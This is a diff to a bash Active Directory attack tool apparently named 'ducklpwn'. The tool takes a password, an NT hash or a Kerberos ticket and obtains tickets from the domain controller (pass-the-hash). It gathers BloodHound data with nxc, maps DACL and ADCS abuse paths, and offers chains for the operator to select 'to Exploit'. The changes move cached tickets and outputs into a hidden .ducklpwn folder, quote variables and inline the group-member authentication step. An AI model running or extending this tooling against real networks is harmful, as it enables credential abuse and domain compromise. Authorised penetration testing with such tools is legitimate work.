@@ -1,7 +1,8 @@
 #!/bin/bash
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 . "$SCRIPT_DIR/exploits.sh"
-mkdir -p ./ducklpwn_files
+DUCKPWN_DIR="./.ducklpwn"
+mkdir -p "$DUCKPWN_DIR"
 
 # Define colors (non-bold versions)
 WHITE='\033[0;37m'      # Abuse type
@@ -247,16 +248,22 @@ authenticate_user() {
             1)
                 read -erp "[?] Enter password for $AUTH_USER: " password </dev/tty
                 echo
-                get_ticket "$DC_FQDN" -u "$AUTH_USER" -p "$password"
-                if [ $? -eq 0 ]; then break; fi
+                if get_ticket "$DC_FQDN" -u "$AUTH_USER" -p "$password"; then
+                    mv "./${AUTH_USER}.ccache" "$DUCKPWN_DIR/" 2>/dev/null
+                    export KRB5CCNAME="$DUCKPWN_DIR/${AUTH_USER}.ccache"
+                    break
+                fi
                 ;;
                 
             2)
                 while true; do
                     read -erp "[?] Enter NT hash for $AUTH_USER (32 chars): " nt_hash </dev/tty
                     if [[ "$nt_hash" =~ ^[a-fA-F0-9]{32}$ ]]; then
-                        get_ticket "$DC_FQDN" -u "$AUTH_USER" -H "$nt_hash"
-                        if [ $? -eq 0 ]; then break 2; fi
+                        if get_ticket "$DC_FQDN" -u "$AUTH_USER" -H "$nt_hash"; then
+                            mv "./${AUTH_USER}.ccache" "$DUCKPWN_DIR/" 2>/dev/null
+                            export KRB5CCNAME="$DUCKPWN_DIR/${AUTH_USER}.ccache"
+                            break 2
+                        fi
                         break
                     else
                         echo -e "[-] Invalid hash format. Must be 32-character hex string."
@@ -279,10 +286,10 @@ authenticate_user() {
                     
                     # Clean the source name for filename
                     auth_user_clean=$(echo -e "$AUTH_USER" | sed -e 's/\x1b\[[0-9;]*m//g')
-                    cp "$ticket_file" "./${auth_user_clean}.ccache"
-                    cp "$ticket_file" "./${auth_user_clean,,}.ccache"
+                    cp "$ticket_file" "$DUCKPWN_DIR/${auth_user_clean}.ccache"
+                    cp "$ticket_file" "$DUCKPWN_DIR/${auth_user_clean,,}.ccache"
                     
-                    export KRB5CCNAME="$ticket_file"
+                    export KRB5CCNAME="$DUCKPWN_DIR/${auth_user_clean}.ccache"
                     if klist; then
                         break 2
                     else
@@ -297,67 +304,6 @@ authenticate_user() {
                 ;;
         esac
         
-        echo -e "[-] Authentication failed. Please try again.\n"
-    done
-}
-
-authenticate_group_member() {
-    local source="$1"
-    local DC_FQDN="$2"
-    
-    while true; do
-        # Ask for username - use $source (the group name) in prompt
-        read -erp $'[?] Enter username for a member of '"${source}"$'\e[0m: ' username </dev/tty
-        # Convert to uppercase but preserve existing $ if present
-        if [[ "$username" == *\$ ]]; then
-            SRC=$(echo "${username%\$}" | tr '[:lower:]' '[:upper:]')"\$"
-        else
-            SRC=$(echo "$username" | tr '[:lower:]' '[:upper:]')
-        fi
-        
-        # Authentication menu
-        echo "[?] Choose authentication method for $SRC:"
-        echo "  1) Password"
-        echo "  2) NT hash"
-        echo "  3) Kerberos ticket file (avoid if privileges need to be updated)"
-        read -erp "Select option (1-3): " auth_method </dev/tty
-        
-        case $auth_method in
-            1)
-                read -erp "[?] Enter password for $SRC: " password </dev/tty
-                echo
-                get_ticket "$DC_FQDN" -u "$SRC" -p "$password"
-                [ $? -eq 0 ] && break
-                ;;
-            2)
-                while true; do
-                    read -erp "[?] Enter NT hash for $SRC (32 chars): " nt_hash </dev/tty
-                    if [[ "$nt_hash" =~ ^[a-fA-F0-9]{32}$ ]]; then
-                        get_ticket "$DC_FQDN" -u "$SRC" -H "$nt_hash"
-                        [ $? -eq 0 ] && break 2
-                        break
-                    else
-                        echo "[-] Invalid hash format. Must be 32-character hex string."
-                    fi
-                done
-                ;;
-            3)
-                while true; do
-                    read -erp "[?] Enter path to Kerberos ticket file: " ticket_file </dev/tty
-                    if [[ -f "$ticket_file" && -s "$ticket_file" ]]; then
-                        cp "$ticket_file" "./${USER}.ccache"
-                        export KRB5CCNAME="$ticket_file"
-                        klist && break 2 || echo "[-] Invalid/expired ticket file"; break
-                    else
-                        echo "[-] Invalid ticket file"
-                        break
-                    fi
-                done
-                ;;
-            *)
-                echo "[-] Invalid selection. Please choose 1, 2, or 3."
-                ;;
-        esac
         echo -e "[-] Authentication failed. Please try again.\n"
     done
 }
@@ -448,21 +394,23 @@ domain=${DC_FQDN#*.}
 flt_domain=${domain^^}
 
 if [[ ! -z $PASSWORD ]]; then
-    get_ticket $DC_FQDN -u $USERNAME -p $PASSWORD
+    get_ticket "$DC_FQDN" -u "$USERNAME" -p "$PASSWORD"
     if [[ $? -ne 0 ]]; then
         echo -e "[-] Ticket generation failed. Check your credentials"
         exit 1
     fi
-    export KRB5CCNAME="./${USERNAME}.ccache"
+    mv "./${USERNAME}.ccache" "$DUCKPWN_DIR/" 2>/dev/null
+    export KRB5CCNAME="$DUCKPWN_DIR/${USERNAME}.ccache"
  
 
 elif [[ ! -z $HASH ]]; then
-    get_ticket $DC_FQDN -u $USERNAME -H $HASH
+    get_ticket "$DC_FQDN" -u "$USERNAME" -H "$HASH"
     if [[ $? -ne 0 ]]; then
         echo -e "[-] Ticket generation failed. Check your credentials"
         exit 1
     fi
-    export KRB5CCNAME="./${USERNAME}.ccache"
+    mv "./${USERNAME}.ccache" "$DUCKPWN_DIR/" 2>/dev/null
+    export KRB5CCNAME="$DUCKPWN_DIR/${USERNAME}.ccache"
 
 
 elif [[ ! -z $KB ]]; then
@@ -480,11 +428,19 @@ if [[ $NO_GATHER == true ]]; then
 else
     echo -e "\n---------------GATHERING LDAP DATA FROM DC----------------"
     if [[ ! -z $PASSWORD ]]; then
-        zip_file=$(nxc ldap "$DC_FQDN" -u $USERNAME -p $PASSWORD --dns-server "$DC_IP" --dns-tcp --dns-timeout 30 --bloodhound --collection All | grep "\.zip" | awk '{print $8}')
+        zip_file_path=$(nxc ldap "$DC_FQDN" -u "$USERNAME" -p "$PASSWORD" --dns-server "$DC_IP" --dns-tcp --dns-timeout 30 --bloodhound --collection All | grep "\.zip" | awk '{print $8}')
     elif [[ ! -z $HASH ]]; then
-        zip_file=$(nxc ldap "$DC_FQDN" -u $USERNAME -H $HASH --dns-server "$DC_IP" --dns-tcp --dns-timeout 30 --bloodhound --collection All | grep "\.zip" | awk '{print $8}')
+        zip_file_path=$(nxc ldap "$DC_FQDN" -u "$USERNAME" -H "$HASH" --dns-server "$DC_IP" --dns-tcp --dns-timeout 30 --bloodhound --collection All | grep "\.zip" | awk '{print $8}')
     else
-        zip_file=$(nxc ldap "$DC_FQDN" --use-kcache --dns-server "$DC_IP" --dns-tcp --dns-timeout 30 --bloodhound --collection All | grep "\.zip" | awk '{print $8}')
+        zip_file_path=$(nxc ldap "$DC_FQDN" --use-kcache --dns-server "$DC_IP" --dns-tcp --dns-timeout 30 --bloodhound --collection All | grep "\.zip" | awk '{print $8}')
+    fi
+
+    if [[ -n "$zip_file_path" && -f "$zip_file_path" ]]; then
+        zip_file_name=$(basename "$zip_file_path")
+        mv "$zip_file_path" "$DUCKPWN_DIR/"
+        zip_file="$DUCKPWN_DIR/$zip_file_name"
+    else
+        zip_file="$zip_file_path"
     fi
 
 
@@ -524,7 +480,7 @@ fi
 
 if [[ $NO_GATHER == false ]]; then
     echo -e "\n[*] Uploading ZIP file to Bloodhound API..."
-    timeout 300 bhcli upload $zip_file
+    timeout 300 bhcli upload "$zip_file"
     exit_code=$?
 
     if [[ $exit_code -eq 124 ]]; then
@@ -620,19 +576,19 @@ if [[ ! -z $DACL ]]; then
     start_time=$(date +%s)
     
     # Parse and prepare DACL data - handle domain suffixes properly
-    echo -e "$DACL" | sed 's/BREAK /\n/g' | sed 's/BREAK//g' | sed "s/@${flt_domain}//g" | sed "s/\.${flt_domain}//g" | sed 's/[[:space:]]*$//' | sort -u > ./DACL_${flt_domain}
+    echo -e "$DACL" | sed 's/BREAK /\n/g' | sed 's/BREAK//g' | sed "s/@${flt_domain}//g" | sed "s/\.${flt_domain}//g" | sed 's/[[:space:]]*$//' | sort -u > "$DUCKPWN_DIR/DACL_${flt_domain}"
     
-    echo -e "[*] Processed $(wc -l < "./DACL_${flt_domain}") unique relationships"
+    echo -e "[*] Processed $(wc -l < "$DUCKPWN_DIR/DACL_${flt_domain}") unique relationships"
 
     # Only align if we have relationships
-    if [[ -s "./DACL_${flt_domain}" ]]; then
-        align_ad_relationships "./DACL_${flt_domain}" > ./DACL_ALIGN_${flt_domain} && mv ./DACL_ALIGN_${flt_domain} ./DACL_${flt_domain}
+    if [[ -s "$DUCKPWN_DIR/DACL_${flt_domain}" ]]; then
+        align_ad_relationships "$DUCKPWN_DIR/DACL_${flt_domain}" > "$DUCKPWN_DIR/DACL_ALIGN_${flt_domain}" && mv "$DUCKPWN_DIR/DACL_ALIGN_${flt_domain}" "$DUCKPWN_DIR/DACL_${flt_domain}"
     else
         echo -e "[-] No relationships found after parsing DACL data"
         exit 1
     fi
 
-    "$SCRIPT_DIR/make_chains.py" "./DACL_${flt_domain}" | sort > "DACL_ABUSE_${flt_domain}.txt"
+    "$SCRIPT_DIR/make_chains.py" "$DUCKPWN_DIR/DACL_${flt_domain}" | sort > "$DUCKPWN_DIR/DACL_ABUSE_${flt_domain}.txt"
 
     end_time=$(date +%s)
     echo -e "${GRAY}[+] Chain building completed in $((end_time - start_time)) seconds${NC}"
@@ -640,33 +596,33 @@ if [[ ! -z $DACL ]]; then
     # FIXED FILTERING LOGIC - PROPERLY SEPARATE PURE MEMBERSHIP CHAINS
 
     # Account operators domain paths - JUST FOR DISPLAY, DON'T REMOVE
-    if [[ -s "DACL_ABUSE_${flt_domain}.txt" ]]; then
-        account_ops_chains=$(cat DACL_ABUSE_${flt_domain}.txt | grep "ACCOUNT OPERATORS" --color=never | grep ${flt_domain} --color=never)
+    if [[ -s "$DUCKPWN_DIR/DACL_ABUSE_${flt_domain}.txt" ]]; then
+        account_ops_chains=$(cat "$DUCKPWN_DIR/DACL_ABUSE_${flt_domain}.txt" | grep "ACCOUNT OPERATORS" --color=never | grep ${flt_domain} --color=never)
         if [[ -n "$account_ops_chains" ]]; then
             echo -e "ACCOUNT OPERATORS MEMBERS FOUND! THIS GROUP HAS GENERIC-ALL ON ALL ACCOUNTS AND GROUPS"
         fi
     fi
 
     # Extract PURE MemberOf chains (chains that contain ONLY MemberOf relationships)
-    if [[ -s "DACL_ABUSE_${flt_domain}.txt" ]]; then
+    if [[ -s "$DUCKPWN_DIR/DACL_ABUSE_${flt_domain}.txt" ]]; then
         # First, create a temporary file with chains that contain ONLY MemberOf
-        grep -E "^[^-]*( ---MemberOf--> [^-]*)*$" "DACL_ABUSE_${flt_domain}.txt" | grep -vE "GenericAll|GenericWrite|WriteOwner|WriteDacl|ForceChangePassword|AllExtendedRights|AddMember|HasSession|GPLink|AllowedToDelegate|CoerceToTGT|AllowedToAct|AdminTo|CanPSRemote|CanRDP|ExecuteDCOM|HasSIDHistory|AddSelf|DCSync|ReadLAPSPassword|ReadGMSAPassword|DumpSMSAPassword|SQLAdmin|AddAllowedToAct|WriteSPN|AddKeyCredentialLink|SyncLAPSPassword|WriteAccountRestrictions|WriteGPLink|GoldenCert|ADCSESC1|ADCSESC3|ADCSESC4|GPOAppliesTo|ADCSESC6a|ADCSESC6b|ADCSESC9a|ADCSESC9b|ADCSESC10a|ADCSESC10b|ADCSESC13|SyncedToEntraUser|CoerceAndRelayNTLMToSMB|CoerceAndRelayNTLMToADCS|WriteOwnerLimitedRights|OwnsLimitedRights|DCFor" > GRPS_${flt_domain}.txt
+        grep -E "^[^-]*( ---MemberOf--> [^-]*)*$" "$DUCKPWN_DIR/DACL_ABUSE_${flt_domain}.txt" | grep -vE "GenericAll|GenericWrite|WriteOwner|WriteDacl|ForceChangePassword|AllExtendedRights|AddMember|HasSession|GPLink|AllowedToDelegate|CoerceToTGT|AllowedToAct|AdminTo|CanPSRemote|CanRDP|ExecuteDCOM|HasSIDHistory|AddSelf|DCSync|ReadLAPSPassword|ReadGMSAPassword|DumpSMSAPassword|SQLAdmin|AddAllowedToAct|WriteSPN|AddKeyCredentialLink|SyncLAPSPassword|WriteAccountRestrictions|WriteGPLink|GoldenCert|ADCSESC1|ADCSESC3|ADCSESC4|GPOAppliesTo|ADCSESC6a|ADCSESC6b|ADCSESC9a|ADCSESC9b|ADCSESC10a|ADCSESC10b|ADCSESC13|SyncedToEntraUser|CoerceAndRelayNTLMToSMB|CoerceAndRelayNTLMToADCS|WriteOwnerLimitedRights|OwnsLimitedRights|DCFor" > "$DUCKPWN_DIR/GRPS_${flt_domain}.txt"
     fi
 
     # Remove chains that end with MemberOf (they don't lead to actual privileges)
-    if [[ -s "DACL_ABUSE_${flt_domain}.txt" ]]; then
-        awk '!/---MemberOf--> [^---]*$/' "DACL_ABUSE_${flt_domain}.txt" > t
-        removed_count=$(($(wc -l < "DACL_ABUSE_${flt_domain}.txt") - $(wc -l < t)))
+    if [[ -s "$DUCKPWN_DIR/DACL_ABUSE_${flt_domain}.txt" ]]; then
+        awk '!/---MemberOf--> [^---]*$/' "$DUCKPWN_DIR/DACL_ABUSE_${flt_domain}.txt" > "$DUCKPWN_DIR/t"
+        removed_count=$(($(wc -l < "$DUCKPWN_DIR/DACL_ABUSE_${flt_domain}.txt") - $(wc -l < "$DUCKPWN_DIR/t")))
         if [[ $removed_count -gt 0 ]]; then
             echo -e "[+] Removed $removed_count chains that end with MemberOf"
         fi
-        mv t "DACL_ABUSE_${flt_domain}.txt"
+        mv "$DUCKPWN_DIR/t" "$DUCKPWN_DIR/DACL_ABUSE_${flt_domain}.txt"
     fi
 fi
 
 
-grep -oP '\x1b\[0;34m\K[^\x1b]*(?=\x1b\[0m)' DACL_ABUSE_${flt_domain}.txt --color=never > ./OU_TARGETS_${flt_domain}.txt
-if [[ -s ./OU_TARGETS_${flt_domain}.txt ]]; then
+grep -oP '\x1b\[0;34m\K[^\x1b]*(?=\x1b\[0m)' "$DUCKPWN_DIR/DACL_ABUSE_${flt_domain}.txt" --color=never > "$DUCKPWN_DIR/OU_TARGETS_${flt_domain}.txt"
+if [[ -s "$DUCKPWN_DIR/OU_TARGETS_${flt_domain}.txt" ]]; then
     OU_JSON=$(curl -s "$BH_URL/api/v2/graphs/cypher" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d "{\"query\":\"MATCH p=shortestPath((s)-[:Contains*1..]->(t)) \\nWHERE s:OU and (t:User or t:Group or t:Computer) \\nAND s<>t AND s.domain = \\\"${flt_domain}\\\"\\nRETURN p\"}")
     OU=$(echo -e "$OU_JSON" | jq -r '
     .data as $data |
@@ -692,11 +648,11 @@ if [[ -s ./OU_TARGETS_${flt_domain}.txt ]]; then
 
     if [[ ! -z $OU ]]; then
         # Read input from file or stdin
-        echo $OU | sed 's/BREAK /\n/g' | sed 's/BREAK//g' | sed "s/@${flt_domain}//g" | sed "s/\.${flt_domain}/\$/g" | sort -u > ./OU_${flt_domain}
-        align_ad_relationships "./OU_${flt_domain}" > ./OU_ALIGN_${flt_domain} && mv ./OU_ALIGN_${flt_domain} ./OU_${flt_domain}
-        "$SCRIPT_DIR/make_chains.py" ./OU_${flt_domain} | sort > OU_ABUSE_${flt_domain}.txt
-        grep -F -f ./OU_TARGETS_${flt_domain}.txt OU_ABUSE_${flt_domain}.txt > t; mv t OU_ABUSE_${flt_domain}.txt
-        if [[ -s OU_ABUSE_${flt_domain}.txt ]]; then
+        echo "$OU" | sed 's/BREAK /\n/g' | sed 's/BREAK//g' | sed "s/@${flt_domain}//g" | sed "s/\.${flt_domain}/\$/g" | sort -u > "$DUCKPWN_DIR/OU_${flt_domain}"
+        align_ad_relationships "$DUCKPWN_DIR/OU_${flt_domain}" > "$DUCKPWN_DIR/OU_ALIGN_${flt_domain}" && mv "$DUCKPWN_DIR/OU_ALIGN_${flt_domain}" "$DUCKPWN_DIR/OU_${flt_domain}"
+        "$SCRIPT_DIR/make_chains.py" "$DUCKPWN_DIR/OU_${flt_domain}" | sort > "$DUCKPWN_DIR/OU_ABUSE_${flt_domain}.txt"
+        grep -F -f "$DUCKPWN_DIR/OU_TARGETS_${flt_domain}.txt" "$DUCKPWN_DIR/OU_ABUSE_${flt_domain}.txt" > "$DUCKPWN_DIR/t"; mv "$DUCKPWN_DIR/t" "$DUCKPWN_DIR/OU_ABUSE_${flt_domain}.txt"
+        if [[ -s "$DUCKPWN_DIR/OU_ABUSE_${flt_domain}.txt" ]]; then
             echo -e "\n---------OU CHILD OBJECTS----------"
             awk -F ' ---' '
             {
@@ -716,11 +672,11 @@ if [[ -s ./OU_TARGETS_${flt_domain}.txt ]]; then
                     printf "%s", paths[node];
                     first_group = 0;
                 }
-            }' "OU_ABUSE_${flt_domain}.txt"
+            }' "$DUCKPWN_DIR/OU_ABUSE_${flt_domain}.txt"
         fi
     fi
 fi
-input_file="DACL_ABUSE_${flt_domain}.txt"
+input_file="$DUCKPWN_DIR/DACL_ABUSE_${flt_domain}.txt"
 
 # Verify file exists and is readable
 if [ ! -f "$input_file" ] || [ ! -r "$input_file" ]; then
@@ -751,7 +707,7 @@ get_unique_sources() {
 # --------------------------------------Main menu - simplified version
 
 # Read all chains into an array (with colors preserved)
-readarray -t all_chains < "DACL_ABUSE_${flt_domain}.txt"
+readarray -t all_chains < "$DUCKPWN_DIR/DACL_ABUSE_${flt_domain}.txt"
 
 # Check if we have any chains
 if [ ${#all_chains[@]} -eq 0 ]; then
@@ -760,14 +716,14 @@ if [ ${#all_chains[@]} -eq 0 ]; then
 fi
 
 # Display pure membership chains first (information only)
-if [[ -s GRPS_${flt_domain}.txt ]]; then
+if [[ -s "$DUCKPWN_DIR/GRPS_${flt_domain}.txt" ]]; then
     echo -e "\n${BOLD}${YELLOW}PURE MEMBERSHIP CHAINS (Information Only)${NC}"
     echo -e "=========================================================="
-    cat GRPS_${flt_domain}.txt
+    cat "$DUCKPWN_DIR/GRPS_${flt_domain}.txt"
 fi
 
 # Display DACL abuse chains with numbers and colors
-if [[ -s DACL_ABUSE_${flt_domain}.txt ]]; then
+if [[ -s "$DUCKPWN_DIR/DACL_ABUSE_${flt_domain}.txt" ]]; then
     echo -e "\n${BOLD}${YELLOW}DACL ABUSE CHAINS (Select to Exploit)${NC}"
     echo -e "=========================================================="
     for i in "${!all_chains[@]}"; do
@@ -798,24 +754,27 @@ while true; do
             if [[ "$start_node_type" == "Group" ]]; then
                 while true; do
                     read -erp "${YELLOW}[?] Input credentials for a member of $start_node (USER:PASS / USER:HASH / USER:TGT_FILE): ${NC}" credentials </dev/tty
-                    creds=$(echo $credentials | awk -F":" '{print $2}')
-                    creds_src=$(echo $credentials | awk -F":" '{print $1}')
+                    creds=$(echo "$credentials" | awk -F":" '{print $2}')
+                    creds_src=$(echo "$credentials" | awk -F":" '{print $1}')
 
                     if [[ "$creds" =~ ^[a-fA-F0-9]{32}$ ]]; then
-                        get_ticket $DC_FQDN -u $creds_src -H $creds
-                        if [ $? -eq 0 ]; then 
+                        if get_ticket "$DC_FQDN" -u "$creds_src" -H "$creds"; then
+                            mv "./${creds_src}.ccache" "$DUCKPWN_DIR/" 2>/dev/null
+                            export KRB5CCNAME="$DUCKPWN_DIR/${creds_src}.ccache"
                             AUTH_USER="$creds_src"
                             break
                         fi
-                    elif [[ -s $creds ]]; then
-                        cp $creds "./${creds_src^^}.ccache"
-                        export KRB5CCNAME="$creds"
-                        klist
-                        AUTH_USER="$creds_src"
-                        break
+                    elif [[ -s "$creds" ]]; then
+                        cp "$creds" "$DUCKPWN_DIR/${creds_src^^}.ccache"
+                        export KRB5CCNAME="$DUCKPWN_DIR/${creds_src^^}.ccache"
+                        if klist; then
+                            AUTH_USER="$creds_src"
+                            break
+                        fi
                     else
-                        get_ticket $DC_FQDN -u $creds_src -p $creds
-                        if [ $? -eq 0 ]; then 
+                        if get_ticket "$DC_FQDN" -u "$creds_src" -p "$creds"; then
+                            mv "./${creds_src}.ccache" "$DUCKPWN_DIR/" 2>/dev/null
+                            export KRB5CCNAME="$DUCKPWN_DIR/${creds_src}.ccache"
                             AUTH_USER="$creds_src"
                             break
                         fi
@@ -826,7 +785,7 @@ while true; do
             else
                 # For non-group starting nodes, use the node itself
                 AUTH_USER="$start_node"
-                authenticate_user $AUTH_USER $DC_FQDN
+                authenticate_user "$AUTH_USER" "$DC_FQDN"
             fi
             
             echo -e "\n${GREEN}[+] Authentication successful for: $AUTH_USER${NC}"
@@ -870,7 +829,67 @@ for chain in "${selected_chains[@]}"; do
         if [[ "$prev_abuse" == "MemberOf" && "$prev_source_type" == "User" ]]; then
             SRC="$prev_src"
         elif [[ "$source_type" == "Group" && "$prev_abuse" != "MemberOf" ]]; then
-            authenticate_group_member $source $DC_FQDN
+            while true; do
+                # Ask for username - use $source (the group name) in prompt
+                read -erp $'[?] Enter username for a member of '"${source}"$'\e[0m: ' username </dev/tty
+                # Convert to uppercase but preserve existing $ if present
+                if [[ "$username" == *\$ ]]; then
+                    SRC=$(echo "${username%\$}" | tr '[:lower:]' '[:upper:]')"\$"
+                else
+                    SRC=$(echo "$username" | tr '[:lower:]' '[:upper:]')
+                fi
+                
+                # Authentication menu
+                echo "[?] Choose authentication method for $SRC:"
+                echo "  1) Password"
+                echo "  2) NT hash"
+                echo "  3) Kerberos ticket file"
+                read -erp "Select option (1-3): " auth_method </dev/tty
+                
+                case $auth_method in
+                    1)
+                        read -erp "[?] Enter password for $SRC: " password </dev/tty
+                        echo
+                        if get_ticket "$DC_FQDN" -u "$SRC" -p "$password"; then
+                            mv "./${SRC}.ccache" "$DUCKPWN_DIR/" 2>/dev/null
+                            export KRB5CCNAME="$DUCKPWN_DIR/${SRC}.ccache"
+                            break
+                        fi
+                        ;;
+                    2)
+                        while true; do
+                            read -erp "[?] Enter NT hash for $SRC (32 chars): " nt_hash </dev/tty
+                            if [[ "$nt_hash" =~ ^[a-fA-F0-9]{32}$ ]]; then
+                                if get_ticket "$DC_FQDN" -u "$SRC" -H "$nt_hash"; then
+                                    mv "./${SRC}.ccache" "$DUCKPWN_DIR/" 2>/dev/null
+                                    export KRB5CCNAME="$DUCKPWN_DIR/${SRC}.ccache"
+                                    break 2
+                                fi
+                                break
+                            else
+                                echo "[-] Invalid hash format. Must be 32-character hex string."
+                            fi
+                        done
+                        ;;
+                    3)
+                        while true; do
+                            read -erp "[?] Enter path to Kerberos ticket file: " ticket_file </dev/tty
+                            if [[ -f "$ticket_file" && -s "$ticket_file" ]]; then
+                                cp "$ticket_file" "$DUCKPWN_DIR/${USER}.ccache"
+                                export KRB5CCNAME="$DUCKPWN_DIR/${USER}.ccache"
+                                klist && break 2 || echo "[-] Invalid/expired ticket file"; break
+                            else
+                                echo "[-] Invalid ticket file"
+                                break
+                            fi
+                        done
+                        ;;
+                    *)
+                        echo "[-] Invalid selection. Please choose 1, 2, or 3."
+                        ;;
+                esac
+                echo -e "[-] Authentication failed. Please try again.\n"
+            done
         else
             SRC="$source"
         fi
@@ -915,5 +934,3 @@ for chain in "${selected_chains[@]}"; do
         done
     done
 done
-
-
